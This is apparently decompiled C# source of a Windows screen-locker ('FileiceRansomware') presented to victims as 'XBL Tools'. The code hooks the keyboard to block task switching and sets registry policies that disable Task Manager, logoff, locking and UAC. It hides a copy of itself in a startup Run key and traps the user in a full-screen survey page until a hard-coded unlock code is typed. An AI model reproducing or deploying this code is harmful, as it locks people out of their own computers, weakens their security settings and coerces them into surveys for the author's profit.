using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using FileiceRansomware.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace FileiceRansomware;

[DesignerGenerated]
public class Form1 : Form
{
	public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private IContainer components;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("SurveyList")]
	private TabPage _SurveyList;

	[AccessedThroughProperty("TabPage3")]
	private TabPage _TabPage3;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("TxtUnlock")]
	private TextBox _TxtUnlock;

	[AccessedThroughProperty("BtnUnlock")]
	private Button _BtnUnlock;

	[AccessedThroughProperty("MenuStrip1")]
	private MenuStrip _MenuStrip1;

	[AccessedThroughProperty("TestToolStripMenuItem")]
	private ToolStripMenuItem _TestToolStripMenuItem;

	[AccessedThroughProperty("wb")]
	private eWebbrowser _wb;

	private const int WH_KEYBOARD_LL = 13;

	private IntPtr intLLKey;

	internal virtual GroupBox GroupBox1
	{
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage SurveyList
	{
		get
		{
			return _SurveyList;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SurveyList = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		get
		{
			return _TabPage3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabPage3 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual TextBox TxtUnlock
	{
		get
		{
			return _TxtUnlock;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TxtUnlock = value;
		}
	}

	internal virtual Button BtnUnlock
	{
		get
		{
			return _BtnUnlock;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = BtnUnlock_Click;
			if (_BtnUnlock != null)
			{
				((Control)_BtnUnlock).remove_Click(eventHandler);
			}
			_BtnUnlock = value;
			if (_BtnUnlock != null)
			{
				((Control)_BtnUnlock).add_Click(eventHandler);
			}
		}
	}

	internal virtual MenuStrip MenuStrip1
	{
		get
		{
			return _MenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem TestToolStripMenuItem
	{
		get
		{
			return _TestToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TestToolStripMenuItem = value;
		}
	}

	public virtual eWebbrowser wb
	{
		get
		{
			return _wb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			eWebbrowser.WebBrowserNewWindowExtendedEventHandler value2 = wb_NewWindowExtended;
			CancelEventHandler cancelEventHandler = wb_NewWindow;
			if (_wb != null)
			{
				_wb.NewWindowExtended -= value2;
				((WebBrowser)_wb).remove_NewWindow(cancelEventHandler);
			}
			_wb = value;
			if (_wb != null)
			{
				_wb.NewWindowExtended += value2;
				((WebBrowser)_wb).add_NewWindow(cancelEventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bc: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0367: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Unknown result type (might be due to invalid IL or missing references)
		GroupBox1 = new GroupBox();
		Label1 = new Label();
		TxtUnlock = new TextBox();
		BtnUnlock = new Button();
		TabControl1 = new TabControl();
		SurveyList = new TabPage();
		TabPage3 = new TabPage();
		MenuStrip1 = new MenuStrip();
		TestToolStripMenuItem = new ToolStripMenuItem();
		((Control)GroupBox1).SuspendLayout();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage3).SuspendLayout();
		((Control)MenuStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TxtUnlock);
		((Control)GroupBox1).get_Controls().Add((Control)(object)BtnUnlock);
		GroupBox groupBox = GroupBox1;
		Point location = new Point(8, 6);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		Size size = new Size(391, 193);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(7);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Unlock Box");
		Label label = Label1;
		location = new Point(225, 14);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(149, 149);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(8);
		Label1.set_Text("When the survey is completed and the download unlocks, type the \"filename\" of the locked file to unlock your PC.");
		Label1.set_TextAlign((ContentAlignment)32);
		TextBox txtUnlock = TxtUnlock;
		location = new Point(22, 60);
		((Control)txtUnlock).set_Location(location);
		((Control)TxtUnlock).set_Name("TxtUnlock");
		TextBox txtUnlock2 = TxtUnlock;
		size = new Size(185, 26);
		((Control)txtUnlock2).set_Size(size);
		((Control)TxtUnlock).set_TabIndex(7);
		Button btnUnlock = BtnUnlock;
		location = new Point(22, 94);
		((Control)btnUnlock).set_Location(location);
		((Control)BtnUnlock).set_Name("BtnUnlock");
		Button btnUnlock2 = BtnUnlock;
		size = new Size(185, 33);
		((Control)btnUnlock2).set_Size(size);
		((Control)BtnUnlock).set_TabIndex(6);
		((ButtonBase)BtnUnlock).set_Text("Unlock PC");
		((ButtonBase)BtnUnlock).set_UseVisualStyleBackColor(true);
		((Control)TabControl1).get_Controls().Add((Control)(object)SurveyList);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage3);
		((Control)TabControl1).set_Dock((DockStyle)5);
		((Control)TabControl1).set_Font(new Font("Lucida Sans", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TabControl tabControl = TabControl1;
		location = new Point(0, 0);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl1;
		size = new Size(534, 508);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(8);
		((Control)SurveyList).set_Font(new Font("Modern No. 20", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TabPage surveyList = SurveyList;
		location = new Point(4, 27);
		surveyList.set_Location(location);
		((Control)SurveyList).set_Name("SurveyList");
		TabPage surveyList2 = SurveyList;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)surveyList2).set_Padding(padding);
		TabPage surveyList3 = SurveyList;
		size = new Size(526, 477);
		((Control)surveyList3).set_Size(size);
		SurveyList.set_TabIndex(0);
		SurveyList.set_Text("Select Your Survey");
		SurveyList.set_UseVisualStyleBackColor(true);
		((Control)TabPage3).get_Controls().Add((Control)(object)GroupBox1);
		TabPage tabPage = TabPage3;
		location = new Point(4, 27);
		tabPage.set_Location(location);
		((Control)TabPage3).set_Name("TabPage3");
		TabPage tabPage2 = TabPage3;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage3;
		size = new Size(526, 477);
		((Control)tabPage3).set_Size(size);
		TabPage3.set_TabIndex(2);
		TabPage3.set_Text("Unlock Your PC");
		TabPage3.set_UseVisualStyleBackColor(true);
		((ToolStrip)MenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)TestToolStripMenuItem });
		MenuStrip menuStrip = MenuStrip1;
		location = new Point(0, 0);
		((Control)menuStrip).set_Location(location);
		((Control)MenuStrip1).set_Name("MenuStrip1");
		MenuStrip menuStrip2 = MenuStrip1;
		size = new Size(534, 24);
		((Control)menuStrip2).set_Size(size);
		((Control)MenuStrip1).set_TabIndex(9);
		((Control)MenuStrip1).set_Text("MenuStrip1");
		((Control)MenuStrip1).set_Visible(false);
		((ToolStripItem)TestToolStripMenuItem).set_Name("TestToolStripMenuItem");
		TestToolStripMenuItem.set_ShortcutKeys((Keys)262259);
		ToolStripMenuItem testToolStripMenuItem = TestToolStripMenuItem;
		size = new Size(38, 20);
		((ToolStripItem)testToolStripMenuItem).set_Size(size);
		((ToolStripItem)TestToolStripMenuItem).set_Text("test");
		((ToolStripItem)TestToolStripMenuItem).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(534, 508);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TabControl1);
		((Control)this).get_Controls().Add((Control)(object)MenuStrip1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("XBL Tools");
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage3).ResumeLayout(false);
		((Control)MenuStrip1).ResumeLayout(false);
		((Control)MenuStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SetWindowsHookExA(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool UnhookWindowsHookEx(IntPtr hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int CallNextHookEx(IntPtr hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	private int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		bool flag = false;
		switch (wParam)
		{
		case 256:
		case 257:
		case 260:
		case 261:
			flag = ((lParam.vkCode == 9 && lParam.flags == 32) ? true : false) | ((lParam.vkCode == 27 && lParam.flags == 32) ? true : false) | ((lParam.vkCode == 27 && lParam.flags == 0) ? true : false) | ((lParam.vkCode == 91 && lParam.flags == 1) ? true : false) | ((lParam.vkCode == 92 && lParam.flags == 1) ? true : false);
			break;
		}
		if (flag)
		{
			return 1;
		}
		return CallNextHookEx(IntPtr.Zero, nCode, wParam, ref lParam);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		intLLKey = SetWindowsHookExA(13, LowLevelKeyboardProc, IntPtr.Zero, 0);
		eWebbrowser eWebbrowser3 = (wb = new eWebbrowser());
		((Control)eWebbrowser3).set_Dock((DockStyle)5);
		((WebBrowser)eWebbrowser3).set_IsWebBrowserContextMenuEnabled(false);
		((WebBrowser)eWebbrowser3).set_ScriptErrorsSuppressed(true);
		((Control)SurveyList).get_Controls().Add((Control)(object)eWebbrowser3);
		((WebBrowser)eWebbrowser3).Navigate("http://www.fileice.net/download.php?t=regular&file=");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("DisableTaskMgr", 1);
		registryKey.SetValue("DisableLockWorkstation", 1);
		registryKey.SetValue("DisableChangePassword", 1);
		registryKey2.SetValue("NoClose", 1);
		registryKey2.SetValue("NoLogoff", 1);
		registryKey3.SetValue("HideFastUserSwitching", 1);
		registryKey3.SetValue("EnableLUA", 0);
		registryKey4.SetValue("Sdchost", "C:\\seo\\Sdchost.exe");
		registryKey.Close();
		registryKey2.Close();
		registryKey3.Close();
		registryKey4.Close();
		try
		{
			if (!File.Exists("C:\\seo\\Sdchost.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), "C:\\seo\\Sdchost.exe", true);
				File.SetAttributes("C:\\seo\\Sdchost.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"error can't add to startup", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void wb_NewWindow(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void wb_NewWindowExtended(object sender, eWebbrowser.WebBrowserNewWindowExtendedEventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		e.Cancel = true;
		string url = e.Url;
		TabPage val = new TabPage();
		eWebbrowser eWebbrowser3 = (wb = new eWebbrowser());
		((Control)eWebbrowser3).set_Dock((DockStyle)5);
		((WebBrowser)eWebbrowser3).set_IsWebBrowserContextMenuEnabled(false);
		((WebBrowser)eWebbrowser3).set_ScriptErrorsSuppressed(true);
		val.set_Text("Survey");
		((Control)val).get_Controls().Add((Control)(object)eWebbrowser3);
		TabControl1.get_TabPages().Add(val);
		TabControl1.set_SelectedTab(val);
		eWebbrowser3.Navigate2(url);
	}

	private void BtnUnlock_Click(object sender, EventArgs e)
	{
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TxtUnlock.get_Text(), "ThxForYurTyme", false) == 0)
		{
			UnhookWindowsHookEx(intLLKey);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey.SetValue("DisableTaskMgr", 0);
			registryKey.SetValue("DisableLockWorkstation", 0);
			registryKey.SetValue("DisableChangePassword", 0);
			registryKey2.SetValue("NoClose", 0);
			registryKey2.SetValue("NoLogoff", 0);
			registryKey3.SetValue("HideFastUserSwitching", 0);
			registryKey.Close();
			registryKey2.Close();
			registryKey3.Close();
			try
			{
				if (File.Exists("C:\\seo\\Sdchost.exe"))
				{
					File.Delete("C:\\seo\\Sdchost.exe");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Interaction.MsgBox((object)"Your PC is unlocked as promised, Thanks for your time!", (MsgBoxStyle)0, (object)null);
				((Form)this).Close();
				ProjectData.ClearProjectError();
			}
			Interaction.MsgBox((object)"Your PC is unlocked as promised, Thanks for your time!", (MsgBoxStyle)0, (object)null);
			((Form)this).Close();
		}
		else
		{
			Interaction.MsgBox((object)"Invalid response, please complete a survey to proceed", (MsgBoxStyle)0, (object)null);
		}
	}
}
